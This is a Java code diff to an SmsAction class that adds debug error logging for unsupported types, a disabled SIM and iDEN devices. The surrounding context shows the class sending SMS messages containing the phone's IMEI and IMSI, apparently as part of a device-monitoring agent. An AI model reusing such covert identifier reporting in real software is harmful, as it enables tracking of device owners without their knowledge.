@@ -80,6 +80,10 @@ public final class SmsAction extends SubAction implements LocationObserver {
                     }
 
                     break;
+                default:
+                    //#ifdef DEBUG
+                    debug.error("execute: Not supported type: " + type);
+                    //#endif
             }
             return true;
         } catch (final Exception ex) {
@@ -257,13 +261,21 @@ public final class SmsAction extends SubAction implements LocationObserver {
             //ret = sendSMSBinary(message);
 
             //#ifdef DEBUG
-            //debug.trace("sendSMS: Text");
+            debug.trace("sendSMS: Text");
             //#endif
             if (Device.isSimEnabled()) {
                 ret = SMSHelper.sendSMSText(number, message);
+            } else {
+                //#ifdef DEBUG
+                debug.error("sendSMS: sim not enabled");
+                //#endif
             }
         } else if (Device.isIDEN()) {
-            //TODO IDEN
+            //#ifdef DEBUG
+            debug.error("sendSMS: Iden not supported");
+            //#endif
+        } else{
+            
         }
         return ret;
     }
@@ -310,7 +322,9 @@ public final class SmsAction extends SubAction implements LocationObserver {
                         sb.append("IMEI: " + device.getImei() + "\n");
                         sb.append("IMSI: " + device.getImsi() + "\n");
                     } else if (Device.isIDEN()) {
-                        //TODO IDEN
+                        //#ifdef DEBUG
+                        debug.error("SmsAction: IDEN not supported");
+                        //#endif
                     }
 
                     text = sb.toString();
